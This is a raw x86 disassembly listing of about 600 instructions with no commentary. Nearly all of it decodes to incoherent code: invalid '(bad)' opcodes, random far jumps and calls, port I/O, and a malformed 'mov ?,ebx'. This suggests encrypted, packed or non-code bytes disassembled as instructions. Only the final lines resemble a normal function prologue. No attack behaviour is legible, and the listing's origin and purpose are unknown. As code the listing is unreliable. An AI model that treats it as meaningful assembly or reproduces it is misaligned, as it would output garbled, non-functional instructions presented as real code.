  406111:	mov    ebx,0x20b3cc31
  406116:	or     al,BYTE PTR [esi]
  406118:	fld    QWORD PTR [edi+0x2e]
  40611b:	daa    
  40611c:	mov    cs,WORD PTR [ebp+0x67]
  40611f:	xchg   ecx,eax
  406120:	aaa    
  406121:	add    edi,DWORD PTR [eax+0x51]
  406124:	inc    ebp
  406125:	push   edi
  406126:	int3   
  406127:	push   0xc0db43a9
  40612c:	lea    esp,[edi-0x3a1c3ecf]
  406132:	mov    ecx,ebx
  406134:	jge    0x4060d9
  406136:	scas   al,BYTE PTR es:[edi]
  406137:	sbb    DWORD PTR [ecx],ebp
  406139:	mov    ebx,0xda1e46e8
  40613e:	pop    esp
  40613f:	mov    bl,BYTE PTR [ebx+0x68634c18]
  406145:	cwde   
  406146:	out    dx,eax
  406147:	xchg   esp,eax
  406148:	push   ss
  406149:	push   ss
  40614a:	in     al,dx
  40614b:	shl    DWORD PTR [edx-0x7],1
  40614e:	mov    dh,0x64
  406150:	ins    BYTE PTR es:[edi],dx
  406151:	mov    ebx,0xee4a9755
  406156:	lahf   
  406157:	push   0xffffffa9
  406159:	rol    DWORD PTR [ecx-0x52acf5f9],1
  40615f:	or     DWORD PTR [ebx-0x4a],ebp
  406162:	pop    es
  406163:	pop    es
  406164:	push   esp
  406165:	mov    edi,0x389e087
  40616a:	and    al,0x53
  40616c:	ins    BYTE PTR es:[edi],dx
  40616d:	mov    dh,0x69
  40616f:	(bad)  
  406170:	outs   dx,DWORD PTR ds:[esi]
  406171:	(bad)  
  406172:	xchg   ecx,eax
  406173:	rcr    BYTE PTR [ecx+0x64598962],0x1d
  40617a:	xlat   BYTE PTR ds:[ebx]
  40617b:	mov    bl,0x5c
  40617d:	xor    cl,BYTE PTR [eax]
  40617f:	cmp    BYTE PTR ds:0x9872fe73,dh
  406185:	call   0x1c4826be
  40618a:	or     al,0x32
  40618c:	mov    ds:0x29baeaf2,eax
  406191:	outs   dx,DWORD PTR ds:[esi]
  406192:	inc    ebx
  406193:	pop    edi
  406194:	or     al,0x4e
  406196:	test   BYTE PTR [edi],0x44
  406199:	out    0x6c,eax
  40619b:	test   BYTE PTR [ebp+0x48],bh
  40619e:	jecxz  0x4061ad
  4061a0:	sub    al,0x33
  4061a2:	jecxz  0x406219
  4061a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4061a6:	pushf  
  4061a7:	and    ax,0x7dc5
  4061ab:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4061ad:	mov    edx,0x6b3d24c3
  4061b2:	ret    0xd154
  4061b5:	(bad)  
  4061b7:	loop   0x406223
  4061b9:	xchg   edi,eax
  4061ba:	xchg   esi,eax
  4061bb:	bound  eax,QWORD PTR [edx]
  4061bd:	mov    dh,dl
  4061bf:	fild   QWORD PTR [edi-0x15]
  4061c2:	dec    ecx
  4061c3:	pop    ebx
  4061c4:	add    edi,DWORD PTR [si]
  4061c7:	or     BYTE PTR [ecx],bh
  4061c9:	mov    ecx,0xa4da681
  4061ce:	shl    BYTE PTR [ecx+0x30],cl
  4061d1:	pop    esp
  4061d2:	lods   eax,DWORD PTR ds:[esi]
  4061d3:	and    al,0x5
  4061d5:	push   ss
  4061d6:	repz inc edx
  4061d8:	(bad)
  4061dc:	add    eax,0xe198fa6f
  4061e1:	mov    ah,0xc2
  4061e3:	xor    edx,DWORD PTR [edi]
  4061e5:	mov    ch,BYTE PTR [esi]
  4061e7:	push   cs
  4061e8:	sbb    esi,esi
  4061ea:	adc    al,0xba
  4061ec:	sub    al,0xd8
  4061ee:	pusha  
  4061ef:	repz aas 
  4061f1:	inc    edx
  4061f2:	xchg   ebx,eax
  4061f3:	or     al,bh
  4061f5:	popa   
  4061f6:	cmp    edx,ebp
  4061f8:	sbb    al,0x62
  4061fa:	mov    DWORD PTR [ecx-0x76f1b36f],eax
  406200:	add    BYTE PTR [edi],al
  406202:	inc    edx
  406203:	lahf   
  406204:	popf   
  406205:	lds    ecx,FWORD PTR [ecx-0x274ccd45]
  40620b:	mov    eax,0xbd588e4a
  406210:	dec    eax
  406211:	mov    DWORD PTR [ecx+0x1ee3a547],0xcc84b412
  40621b:	pop    ebp
  40621c:	ss push eax
  40621e:	add    al,0xe9
  406220:	ds push ss
  406222:	mov    BYTE PTR fs:[ecx+edx*1-0x3f],bl
  406227:	xor    eax,DWORD PTR [ecx]
  406229:	mov    WORD PTR [eax-0x362d3ac8],cs
  40622f:	dec    ecx
  406230:	jmp    0xcd9d:0x29a2202f
  406237:	test   eax,0xa3ad9642
  40623c:	and    eax,0x924c5c9d
  406241:	jns    0x4061cd
  406243:	push   es
  406244:	push   esi
  406245:	xor    DWORD PTR [ebp+0x72],ebx
  406248:	adc    ax,0xb972
  40624c:	add    DWORD PTR [ecx],0x7495151a
  406252:	pusha  
  406253:	jl     0x40624f
  406255:	cmp    al,0x32
  406257:	xor    ah,cl
  406259:	inc    esi
  40625a:	pop    esi
  40625b:	(bad)  
  40625c:	pop    ds
  40625d:	sbb    esi,0xafd230f1
  406263:	(bad)  [eax+0x3f382c56]
  406269:	repz push eax
  40626b:	jle    0x40629d
  40626d:	add    DWORD PTR [edi-0x530f0111],0x4c
  406274:	sub    cl,dh
  406276:	into   
  406277:	je     0x4062cc
  406279:	iret   
  40627a:	inc    edi
  40627b:	push   0x3c
  40627d:	aaa    
  40627e:	popf   
  40627f:	jne    0x40628f
  406281:	jb     0x4062ba
  406283:	iret   
  406284:	fcomp  QWORD PTR [edx+0x7ab74d0c]
  40628a:	jle    0x406274
  40628c:	jbe    0x406217
  40628e:	sti    
  40628f:	mov    ds:0xa1dd6685,al
  406294:	jmp    0xf041:0x92d6aa38
  40629b:	push   es
  40629c:	xor    BYTE PTR [esi],dh
  40629e:	adc    DWORD PTR [ebp-0x44210e06],0xffffffbc
  4062a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062a6:	jbe    0x406237
  4062a8:	sbb    eax,0xecee657d
  4062ad:	inc    edi
  4062ae:	ins    DWORD PTR es:[edi],dx
  4062af:	push   ds
  4062b0:	(bad)  
  4062b1:	pslld  mm6,mm4
  4062b4:	loop   0x4062da
  4062b6:	mov    edx,0xff32a87
  4062bb:	scas   al,BYTE PTR es:[edi]
  4062bc:	and    edi,DWORD PTR [eax-0x2f]
  4062bf:	bound  esp,QWORD PTR [eax-0x77]
  4062c2:	outs   dx,BYTE PTR ds:[esi]
  4062c3:	iret   
  4062c4:	jbe    0x406326
  4062c6:	cld    
  4062c7:	mov    ch,BYTE PTR [edi-0x5b]
  4062ca:	push   0x69f46341
  4062cf:	inc    esp
  4062d0:	jb     0x406297
  4062d2:	and    ch,BYTE PTR [edi-0x48]
  4062d5:	xchg   ecx,eax
  4062d6:	lods   al,BYTE PTR ds:[esi]
  4062d7:	push   edx
  4062d8:	mov    cl,ah
  4062da:	xchg   edx,eax
  4062db:	int    0xad
  4062dd:	push   ecx
  4062de:	add    al,0xd9
  4062e0:	mov    ch,BYTE PTR [eax-0x40]
  4062e3:	or     eax,0x8bf1f75d
  4062e8:	dec    ebp
  4062e9:	adc    cl,ch
  4062eb:	jmp    0x4062ef
  4062ed:	add    BYTE PTR [eax],al
  4062ef:	(bad)  
  4062f0:	aas    
  4062f1:	ret    0xc9c2
  4062f4:	rol    esi,0xcb
  4062f7:	sbb    DWORD PTR [ebp-0x64],0x344be5c
  4062fe:	icebp  
  4062ff:	faddp  st(7),st
  406301:	js     0x40637b
  406303:	dec    ebp
  406304:	jle    0x40637e
  406306:	js     0x4062ca
  406308:	outs   dx,DWORD PTR ds:[esi]
  406309:	sbb    eax,0x79906278
  40630e:	loop   0x406311
  406310:	pop    edx
  406311:	inc    esi
  406312:	hlt    
  406313:	ror    BYTE PTR [ecx-0x22c3f029],1
  406319:	xchg   ebp,eax
  40631a:	sbb    BYTE PTR [ebp-0x6af83ea],0x17
  406321:	sahf   
  406322:	in     al,dx
  406323:	cmc    
  406324:	push   esp
  406325:	mov    fs,WORD PTR [esp+ebp*8-0x34]
  406329:	sbb    BYTE PTR [edi-0x49f33ad0],ah
  40632f:	or     al,bh
  406331:	bound  edi,QWORD PTR [eax-0x15]
  406334:	psubsb mm1,QWORD PTR [edx]
  406337:	dec    edi
  406338:	fwait
  406339:	cwde   
  40633a:	jge    0x4063a1
  40633c:	dec    ecx
  40633d:	(bad)  
  40633e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40633f:	(bad)
  406343:	in     eax,dx
  406344:	push   ebx
  406345:	mov    WORD PTR [ebx],ss
  406347:	lea    edx,[eax+0x6ec2be7b]
  40634d:	nop
  40634e:	lods   al,BYTE PTR ds:[esi]
  40634f:	jmp    0xe0ed822
  406354:	repz test DWORD PTR [ebp+0x10],ebp
  406358:	mov    edi,0x8a9242a1
  40635d:	lea    ecx,[ecx+0x29]
  406360:	hlt    
  406361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406362:	shl    DWORD PTR [ecx+esi*4-0x3d],1
  406366:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406367:	mov    dh,0x6f
  406369:	or     eax,0x157fd40
  40636e:	adc    DWORD PTR [edi],ecx
  406370:	retf   
  406371:	and    DWORD PTR [eax+0x72cc5c57],ebp
  406377:	dec    ebx
  406378:	pop    es
  406379:	xchg   ebp,eax
  40637a:	mov    ds:0xce1f87e5,al
  40637f:	dec    ebx
  406380:	jge    0x406359
  406382:	jmp    FWORD PTR [esi+0x1258001a]
  406388:	test   ebx,0xc340206d
  40638e:	fxch   st(3)
  406390:	pop    edi
  406391:	or     BYTE PTR [edx+0x1cbab7a7],0x53
  406398:	sub    eax,0x50802336
  40639d:	mov    ebx,0x6adaba43
  4063a2:	repz add eax,0xb0584ff5
  4063a8:	and    ebp,eax
  4063aa:	sub    cl,BYTE PTR [ecx]
  4063ac:	arpl   WORD PTR [edx+ebp*2-0x1d],ax
  4063b0:	popa   
  4063b1:	push   0x50
  4063b3:	push   0x14a35333
  4063b8:	jg     0x4063bb
  4063ba:	push   ecx
  4063bb:	dec    edx
  4063bc:	packssdw mm6,mm0
  4063bf:	int    0xb
  4063c1:	nop
  4063c2:	arpl   WORD PTR [edi],bx
  4063c4:	adc    bl,BYTE PTR [ebp-0x3e32b44e]
  4063ca:	xchg   DWORD PTR [edx+0x57f62a12],edx
  4063d0:	push   esp
  4063d1:	push   edi
  4063d2:	push   ss
  4063d3:	call   0xa006:0xbfb39a08
  4063da:	sub    al,0x30
  4063dc:	push   esi
  4063dd:	mov    dl,0xc6
  4063df:	or     al,0x7e
  4063e1:	rcr    BYTE PTR [ecx-0x985ef62],1
  4063e7:	loop   0x40638f
  4063e9:	int3   
  4063ea:	pop    ebx
  4063eb:	mov    esp,0x50b7fb9e
  4063f0:	rcr    BYTE PTR [esi],cl
  4063f2:	lods   eax,DWORD PTR ds:[esi]
  4063f3:	sbb    ebp,edx
  4063f5:	xchg   ecx,eax
  4063f6:	stc    
  4063f7:	in     eax,0xc2
  4063f9:	sbb    al,0xc0
  4063fb:	mov    bl,0xa4
  4063fd:	or     eax,0x254ec14
  406402:	fcom   QWORD PTR [esi-0x2eca3064]
  406408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406409:	les    ebp,FWORD PTR [ebp+0x584a38e9]
  40640f:	jae    0x406482
  406411:	in     eax,0x62
  406413:	test   ebx,eax
  406415:	jle    0x4063a1
  406417:	rol    DWORD PTR ds:0x2ee83fc7,0x52
  40641e:	add    edx,eax
  406420:	and    ecx,DWORD PTR [esi+0x15]
  406423:	jne    0x406497
  406425:	adc    BYTE PTR [ebx+ebp*8],bh
  406428:	sub    BYTE PTR [esi+0x6f5906c7],al
  40642e:	sub    cl,BYTE PTR [ecx+0x66]
  406431:	mov    eax,0x560f2237
  406436:	push   ds
  406437:	lods   eax,DWORD PTR ds:[esi]
  406438:	pop    ebp
  406439:	xchg   ebx,eax
  40643a:	imul   eax,DWORD PTR [eax+0xd],0x1f
  40643e:	aaa    
  40643f:	mov    cl,0x78
  406441:	push   eax
  406442:	fiadd  DWORD PTR [edi+0x1f]
  406445:	ret    
  406446:	lods   al,BYTE PTR ds:[esi]
  406447:	ret    0x37c6
  40644a:	push   es
  40644b:	mov    ecx,0x844981a5
  406450:	into   
  406451:	mov    ds:0xb978ec1a,eax
  406456:	(bad)  
  406457:	je     0x406474
  406459:	push   ds
  40645a:	and    al,0x75
  40645c:	mov    cl,0x39
  40645e:	pop    edx
  40645f:	adc    BYTE PTR [edx+0x27795cff],bl
  406465:	sti    
  406466:	lods   eax,DWORD PTR fs:[esi]
  406468:	xchg   esp,eax
  406469:	jp     0x4064e6
  40646b:	and    cl,ah
  40646d:	div    BYTE PTR [edi+0x26]
  406470:	cmp    al,0xfb
  406472:	loop   0x406407
  406474:	xor    DWORD PTR [eax+0x5d],esi
  406477:	sar    BYTE PTR [ecx],1
  406479:	in     al,0x22
  40647b:	scas   eax,DWORD PTR es:[edi]
  40647c:	fst    DWORD PTR [edx]
  40647e:	jb     0x406458
  406480:	adc    BYTE PTR [edi+0x78],bl
  406483:	dec    ebx
  406484:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406485:	adc    eax,0x259e3889
  40648a:	or     DWORD PTR [edx+edx*2+0x3f08fcaa],eax
  406491:	push   edi
  406492:	push   ds
  406493:	pop    esi
  406494:	xchg   ebp,eax
  406495:	loope  0x4064e9
  406497:	repz jp 0x406427
  40649a:	in     eax,0x9e
  40649c:	mov    ?,ebx
  40649e:	mov    edx,0x3888f637
  4064a3:	sbb    DWORD PTR [ecx+0x5c99400e],ebp
  4064a9:	fnstenv [esi]
  4064ab:	pop    ds
  4064ac:	push   esi
  4064ad:	sub    DWORD PTR cs:0x33783523,ebp
  4064b4:	sbb    cl,BYTE PTR [ebp-0x1db8f7d1]
  4064ba:	std    
  4064bb:	rcl    ecx,1
  4064bd:	stos   DWORD PTR es:[edi],eax
  4064be:	jp     0x406486
  4064c0:	or     eax,DWORD PTR [ebp+0xd2941ec]
  4064c6:	cwde   
  4064c7:	xor    eax,ecx
  4064c9:	jmp    0x48240e19
  4064ce:	shr    BYTE PTR [edi-0x77],1
  4064d1:	call   0x4ae2dc7d
  4064d6:	inc    ebp
  4064d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064d8:	push   cs
  4064d9:	jns    0x40653d
  4064db:	pop    ds
  4064dc:	jo     0x4064f9
  4064de:	xchg   edi,eax
  4064df:	inc    edi
  4064e0:	(bad)  
  4064e1:	cdq    
  4064e2:	push   ds
  4064e3:	sub    al,0x7a
  4064e5:	mov    bh,0xe8
  4064e7:	aad    0x14
  4064e9:	ds pop edi
  4064eb:	adc    dl,BYTE PTR [edi+0x42]
  4064ee:	dec    ecx
  4064ef:	mov    al,ds:0xc77a71c1
  4064f4:	sti    
  4064f5:	out    dx,eax
  4064f6:	sub    al,0x80
  4064f8:	into   
  4064f9:	outs   dx,DWORD PTR ds:[esi]
  4064fa:	or     edi,DWORD PTR [ebx-0x47dd387b]
  406500:	imul   ch
  406502:	sbb    esi,DWORD PTR [ebx+ebp*4-0x101f23da]
  406509:	mov    ebx,0xc04ce2b1
  40650e:	pushf  
  40650f:	fwait
  406510:	mov    ecx,0x9b811fa0
  406515:	mov    ch,0x25
  406517:	iret   
  406518:	and    edi,edx
  40651a:	xor    al,0xf8
  40651c:	jge    0x40656f
  40651e:	jae    0x406564
  406520:	push   es
  406521:	fst    DWORD PTR [eax+0x3bd99b03]
  406527:	sbb    BYTE PTR gs:[eax-0x2f],dh
  40652b:	sub    BYTE PTR [ecx*8-0x4219d90e],ah
  406532:	mov    ebx,DWORD PTR [ecx]
  406534:	or     al,0x22
  406536:	push   ss
  406537:	push   ss
  406538:	xchg   edi,eax
  406539:	mov    dl,BYTE PTR [ebp-0x7b]
  40653c:	xchg   ebp,eax
  40653d:	sub    DWORD PTR [edx],eax
  40653f:	ss into 
  406541:	and    DWORD PTR [edi+0x36fe0491],edi
  406547:	and    al,0x86
  406549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40654a:	adc    DWORD PTR [ecx+eax*2-0x5117a294],ebx
  406551:	dec    eax
  406552:	xchg   ebx,eax
  406553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406554:	fadd   st(6),st
  406556:	push   esp
  406557:	mov    eax,ds:0x17785774
  40655c:	pop    ds
  40655d:	cmc    
  40655e:	push   es
  40655f:	mov    ds:0xf62561ed,eax
  406564:	leave  
  406565:	in     al,0x13
  406567:	adc    BYTE PTR [eax+0x53],al
  40656a:	mov    eax,0x2e13caca
  40656f:	jno    0x40650c
  406571:	xor    BYTE PTR [ecx-0x4d94e097],ch
  406577:	dec    eax
  406578:	or     cl,BYTE PTR [edi+0x3aed2e68]
  40657e:	dec    eax
  40657f:	xchg   ebp,eax
  406580:	shr    eax,cl
  406582:	enter  0x5653,0x60
  406586:	stc    
  406587:	mov    edi,0x298492df
  40658c:	fcom   DWORD PTR [esi+0x22]
  40658f:	dec    edx
  406590:	(bad)  
  406591:	xchg   edx,eax
  406592:	and    bl,dh
  406594:	shr    dl,cl
  406596:	xor    edx,0x7f
  406599:	enter  0x6a30,0x6f
  40659d:	enter  0x3377,0xe3
  4065a1:	call   FWORD PTR [ebx+0x7b]
  4065a4:	jge    0x406602
  4065a6:	jbe    0x406561
  4065a8:	ret    
  4065a9:	out    dx,al
  4065aa:	in     al,dx
  4065ab:	scas   eax,DWORD PTR es:[edi]
  4065ac:	cs test ah,ah
  4065af:	scas   al,BYTE PTR es:[edi]
  4065b0:	enter  0xe76b,0x7b
  4065b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065b5:	es and eax,0x85f2f890
  4065bb:	xlat   BYTE PTR ds:[ebx]
  4065bc:	push   ds
  4065bd:	leave  
  4065be:	mov    al,0x96
  4065c0:	xchg   DWORD PTR [ecx],ebp
  4065c2:	or     al,0x93
  4065c4:	sub    eax,0x40b5dbe8
  4065c9:	cmp    al,0x56
  4065cb:	dec    esi
  4065cc:	adc    BYTE PTR [esi],0x55
  4065cf:	xor    bh,BYTE PTR [esi+0x60]
  4065d2:	fimul  WORD PTR [edi+0x5efb91d2]
  4065d8:	shl    bl,0x23
  4065db:	enter  0xc981,0x8e
  4065df:	sbb    eax,0xc18b8116
  4065e4:	jmp    0x4068d4
  4065e9:	ds enter 0x3dcf,0xcd
  4065ee:	cmp    eax,0xabe7cfce
  4065f3:	mov    ch,cl
  4065f5:	test   eax,0x339eabcd
  4065fa:	les    edi,FWORD PTR [eax+0x78]
  4065fd:	dec    ebp
  4065fe:	jle    0x406678
  406600:	js     0x40665c
  406602:	push   ebp
  406603:	inc    edx
  406604:	mov    bh,0x25
  406606:	addr16 retf 
  406608:	add    eax,DWORD PTR [ebp-0xc]
  40660b:	call   0xe5f44c75
  406610:	in     al,dx
  406611:	hlt    
  406612:	addr16 dec eax
  406614:	aas    
  406615:	dec    eax
  406616:	fsubr  QWORD PTR [ecx-0x5f]
  406619:	jl     0x40662c
  40661b:	jmp    0x45ea:0x25aa962b
  406622:	aad    0x95
  406624:	fs inc ecx
  406626:	cmp    ah,ah
  406628:	adc    al,0xed
  40662a:	ret    
  40662b:	inc    esp
  40662c:	or     BYTE PTR [ebp+0x779ee8bb],bh
  406632:	imul   ebp,DWORD PTR [eax+0x95c9e20],0xfd898925
  40663c:	jbe    0x406631
  40663e:	dec    esi
  40663f:	mov    dl,0x67
  406641:	or     ebx,edi
  406643:	add    esi,DWORD PTR [eax-0x76]
  406646:	(bad)  
  406649:	(bad)  
  40664a:	shl    BYTE PTR [edx+0x2fd09316],1
  406650:	enter  0x8c09,0x60
  406654:	inc    edi
  406655:	pop    edi
  406656:	and    DWORD PTR [edi],ecx
  406658:	push   ebx
  406659:	ja     0x40666f
  40665b:	xchg   ebp,eax
  40665c:	in     al,0x1d
  40665e:	jp     0x40663a
  406660:	or     al,0xbf
  406662:	stos   BYTE PTR es:[edi],al
  406663:	sbb    bl,BYTE PTR [ebp+edx*8-0x53]
  406667:	js     0x4066c6
  406669:	mov    bh,0xa9
  40666b:	ror    bh,1
  40666d:	lea    ebp,[eax]
  40666f:	in     al,dx
  406670:	mov    BYTE PTR [esi],dl
  406672:	xor    al,0xf0
  406674:	push   ebp
  406675:	fsub   DWORD PTR fs:[ebp+edx*2-0x6737f1d1]
  40667d:	addr16 push cs
  40667f:	or     eax,0xf3e309cd
  406684:	pop    edi
  406685:	clc    
  406686:	jmp    0xd797:0xd61a95d0
  40668d:	push   edi
  40668e:	xchg   ecx,eax
  40668f:	cmc    
  406690:	outs   dx,DWORD PTR ds:[esi]
  406691:	push   0x4d
  406693:	sti    
  406694:	push   ds
  406695:	mov    ds,WORD PTR [edx-0x6aed57a1]
  40669b:	jmp    0xcf78:0x68caa54e
  4066a2:	rcl    DWORD PTR [edx-0x3369e537],cl
  4066a8:	sbb    al,0x99
  4066aa:	leave  
  4066ab:	int3   
  4066ac:	mov    ds:0x673b4311,al
  4066b1:	pusha  
  4066b2:	mov    BYTE PTR [edx],cl
  4066b4:	repnz (bad) 
  4066b6:	pop    ebp
  4066b7:	fcomp  QWORD PTR [edx]
  4066b9:	jp     0x406656
  4066bb:	sbb    BYTE PTR [eax-0x72],dl
  4066be:	and    ebp,edi
  4066c0:	jo     0x4066ee
  4066c2:	hlt    
  4066c3:	scas   al,BYTE PTR es:[edi]
  4066c4:	dec    eax
  4066c5:	iret   
  4066c6:	in     al,0x6f
  4066c8:	icebp  
  4066c9:	loope  0x406730
  4066cb:	loope  0x406664
  4066cd:	cmp    eax,DWORD PTR [esi]
  4066cf:	push   eax
  4066d0:	lods   eax,DWORD PTR ds:[esi]
  4066d1:	jl     0x40671e
  4066d3:	inc    ecx
  4066d4:	iret   
  4066d5:	js     0x40667e
  4066d7:	fidivr WORD PTR [esi+eax*4-0x37a6b13e]
  4066de:	ret    0xb793
  4066e1:	in     eax,0xc
  4066e3:	test   DWORD PTR [edx-0x6a771e11],esp
  4066e9:	fisttp QWORD PTR [ecx+0xe11dbda]
  4066ef:	pop    esp
  4066f0:	mov    edx,0x7c7ff894
  4066f5:	cmp    BYTE PTR [ebx-0x56],bh
  4066f8:	lds    esp,FWORD PTR [eax]
  4066fa:	jns    0x4066ff
  4066fc:	ja     0x40668c
  4066fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ff:	ins    DWORD PTR es:[edi],dx
  406700:	enter  0x1e32,0x5f
  406704:	push   0x7fe97d71
  406709:	fmul   st,st(4)
  40670b:	sub    bl,BYTE PTR [edi]
  40670d:	aaa    
  40670e:	jecxz  0x4066dc
  406710:	jg     0x4066ed
  406712:	fcom   QWORD PTR [ebp-0x49]
  406715:	cmp    eax,0x629c474f
  40671a:	mov    BYTE PTR [ebp-0xb],bh
  40671d:	adc    DWORD PTR [eax-0x2c81d0c3],esi
  406723:	rcl    DWORD PTR [eax+0x1],0x1b
  406727:	nop
  406728:	stc    
  406729:	imul   esp,DWORD PTR [edi+0x7],0x16b4366b
  406730:	std    
  406731:	cld    
  406732:	xchg   ebp,eax
  406733:	xchg   ebx,eax
  406734:	enter  0x4c58,0xe2
  406738:	xchg   edi,eax
  406739:	mov    DWORD PTR [edx-0x65],ecx
  40673c:	inc    ebx
  40673d:	mov    al,0x4c
  40673f:	jl     0x4067ac
  406741:	jmp    0x406700
  406743:	(bad)  [eax]
  406745:	retf   0xcc0c
  406748:	fsub   st(1),st
  40674a:	retf   0x7dfd
  40674d:	into   
  40674e:	pop    es
  40674f:	xchg   esp,eax
  406750:	add    al,0xae
  406752:	bound  ebp,QWORD PTR [edx-0x14ef7cea]
  406758:	ss (bad) 
  40675a:	fcmovbe st,st(5)
  40675c:	mov    ebp,0x24f2d4ee
  406761:	or     al,0x60
  406763:	rol    BYTE PTR [edx+0x32],0xf5
  406767:	scas   eax,DWORD PTR es:[edi]
  406768:	mov    ch,0xf0
  40676a:	test   edx,ecx
  40676c:	enter  0xcf36,0x38
  406770:	mov    ecx,0x61e3ef38
  406775:	dec    edi
  406776:	aad    0xbc
  406778:	(bad)  
  406779:	push   esi
  40677a:	mov    ah,0x63
  40677c:	inc    edi
  40677d:	mov    eax,0xff520aba
  406782:	xlat   BYTE PTR ds:[ebx]
  406783:	jle    0x4067f1
  406785:	outs   dx,BYTE PTR ds:[esi]
  406786:	mov    ds:0x18be7240,ax
  40678c:	and    DWORD PTR [esi+0x12],edx
  40678f:	out    0x73,eax
  406791:	(bad)  
  406792:	aam    0xb1
  406794:	call   0xb1420e6
  406799:	mov    ds:0xd9c78e2d,eax
  40679e:	push   0xa7a5694e
  4067a3:	push   ds
  4067a4:	scas   eax,DWORD PTR es:[edi]
  4067a5:	cmp    al,0x59
  4067a7:	cmp    ch,ah
  4067a9:	leave  
  4067aa:	jbe    0x4067c4
  4067ac:	jb     0x4067fc
  4067ae:	inc    eax
  4067af:	sbb    al,0x91
  4067b1:	loopne 0x4067b0
  4067b3:	sub    BYTE PTR [edx-0x667656f],dl
  4067b9:	ror    DWORD PTR [edi],cl
  4067bb:	mov    ds:0x779fe791,al
  4067c0:	lea    ebp,[edx]
  4067c2:	adc    eax,0x14d0e2e
  4067c7:	aad    0xaf
  4067c9:	dec    esi
  4067ca:	mov    esp,0x5ea14ee2
  4067cf:	scas   eax,DWORD PTR es:[edi]
  4067d0:	bound  edx,QWORD PTR [ebx]
  4067d2:	idiv   BYTE PTR [ebx+0x5c]
  4067d5:	inc    esi
  4067d6:	lock retf 0xe561
  4067da:	sbb    al,0x8c
  4067dc:	pop    ebx
  4067dd:	nop
  4067de:	push   esp
  4067df:	sbb    al,0xd8
  4067e1:	js     0x40676a
  4067e3:	or     al,0x66
  4067e5:	pop    ds
  4067e6:	inc    ebp
  4067e7:	stc    
  4067e8:	add    DWORD PTR [ebp+0x41dfa245],ecx
  4067ee:	mov    edi,0x1b92a183
  4067f3:	in     eax,dx
  4067f4:	inc    esi
  4067f5:	mov    ch,0x5e
  4067f7:	jle    0x406828
  4067f9:	bound  esi,QWORD PTR [esi-0x11]
  4067fc:	adc    ah,BYTE PTR [esi+ebp*4]
  4067ff:	xor    BYTE PTR [edi-0x3e],al
  406802:	or     edi,esp
  406804:	sub    eax,0x59f3a1b6
  406809:	add    eax,edi
  40680b:	popa   
  40680c:	mov    al,fs:0xc9e420b5
  406812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406813:	mov    cl,0xe6
  406815:	xlat   BYTE PTR ds:[ebx]
  406816:	dec    ecx
  406817:	inc    edi
  406818:	push   esp
  406819:	aam    0xfb
  40681b:	mov    ds,WORD PTR [ebx-0x79]
  40681e:	fdivr  st,st(2)
  406820:	push   ebp
  406821:	sar    bh,1
  406823:	dec    eax
  406824:	sub    BYTE PTR [ebx+0x6e2f7990],bh
  40682a:	mov    BYTE PTR [eax],ah
  40682c:	lods   eax,DWORD PTR ds:[esi]
  40682d:	out    0xfc,al
  40682f:	repnz fild DWORD PTR [ebp+0x770d4045]
  406836:	adc    eax,0xa08ac410
  40683b:	push   esp
  40683c:	(bad)  
  40683d:	cwde   
  40683e:	cmp    bl,BYTE PTR [edx]
  406840:	cmp    BYTE PTR [esi+0x30ec3153],0xc2
  406847:	fwait
  406848:	ret    0x9ceb
  40684b:	sub    al,0x97
  40684d:	(bad)  
  40684f:	pop    edx
  406850:	popa   
  406851:	leave  
  406852:	(bad)  
  406853:	out    dx,al
  406854:	sub    DWORD PTR [edi-0x51],esp
  406857:	jg     0x406825
  406859:	out    0x26,al
  40685b:	iret   
  40685c:	xchg   esp,eax
  40685d:	rcr    DWORD PTR [edi+0x2fc503c6],1
  406863:	and    eax,0xe1a8bd43
  406868:	outs   dx,DWORD PTR ds:[esi]
  406869:	jmp    0xf8a8bf0f
  40686e:	mov    bl,0x7
  406870:	pop    es
  406871:	ds push eax
  406873:	inc    eax
  406874:	lods   al,BYTE PTR ds:[esi]
  406875:	cmp    ah,BYTE PTR [ecx-0x2]
  406878:	(bad)  
  406879:	mov    eax,ds:0x95109cdc
  40687e:	mov    eax,ds:0x2ff8e28a
  406883:	lea    edi,[ecx+0x9]
  406886:	je     0x4068be
  406888:	fs cwde 
  40688a:	mov    ds:0x4f7c7f63,eax
  40688f:	iret   
  406890:	inc    eax
  406891:	jg     0x4068b7
  406893:	jmp    0x9cdb:0x568206e8
  40689a:	inc    esp
  40689b:	xor    BYTE PTR [esi+eiz*4+0x42ac265b],ah
  4068a2:	sti    
  4068a3:	scas   al,BYTE PTR es:[edi]
  4068a4:	sbb    ch,ah
  4068a6:	mov    ds:0x5dd6bf,eax
  4068ab:	sbb    al,0x3
  4068ad:	retf   0x1113
  4068b0:	xchg   ecx,eax
  4068b1:	call   DWORD PTR [ebp+0x29]
  4068b4:	in     al,0x87
  4068b6:	mov    eax,0xe627a734
  4068bb:	mov    ebp,0x2e544bc1
  4068c0:	add    bl,BYTE PTR ds:[ebx+eiz*8-0x38]
  4068c5:	aaa    
  4068c6:	cmp    eax,0xc4001b20
  4068cb:	and    eax,0xea1eddfa
  4068d0:	adc    BYTE PTR [eax+eax*4+0x57],0x5d
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
